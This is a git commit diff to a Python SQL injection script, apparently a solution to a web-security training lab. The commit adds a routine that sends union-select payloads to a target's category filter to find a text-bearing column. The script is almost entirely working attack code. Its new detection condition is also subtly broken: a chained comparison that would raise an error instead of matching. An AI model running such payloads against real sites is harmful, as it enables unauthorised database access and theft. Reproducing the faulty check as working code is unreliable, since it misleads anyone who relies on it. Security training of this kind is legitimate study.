27dacd3d39a4ef34a7459e905de3d7c0e6633c79
Michael Byrd <iamtron01@hotmail.com>
2024-06-06 14:47:29 -0500

    bug fixes

--- sql-injection/sqli-lab-04.py
+++ sql-injection/sqli-lab-04.py
@@ -18,14 +18,34 @@ def get_exploit_column_number(url):
             proxies=proxies)
         if "Internal Server Error" in response.text:
             return number - 1
-    raise  ValueError("Max number of tries exceeded, 50")
+    raise ValueError("Max number of tries exceeded, 50")
+
+def get_exploit_sqli_string_field(url, num_col):
+    uri = "filter?category=Gifts"
+    for number in range(1, num_col+1):
+        string = "'JgLv7K'"
+        payload_list = ['null'] * num_col
+        payload_list[number-1] = string
+        sql_payload = (
+            "' union select " + 
+            ','.join(payload_list) 
+            + "--")
+        response = requests.get(
+            url + uri + sql_payload,
+            verify=False,
+            proxies=proxies)
+        if (response.text.count(string.strip('\'')) == 2 in response.text):
+            return number
+    raise ValueError("Could not find the string column")
 
 if __name__ == "__main__":
     try:
-        url = sys.argv[1].strip()
+        url = sys.argv[1]
         print("[+] Figuring out number of columns...")
         column_number = get_exploit_column_number(url)
         print("[+] The number of columns is " + str(column_number) + "." )
+        string_column = get_exploit_sqli_string_field(url, column_number)
+        print("[+] The column that contains text is " + str(string_column) + ".")
     except IndexError:
         print("[-] Usage: %s <url>" % sys.argv[0])
         print("[-] Example: %s www.example.com" % sys.argv[0])
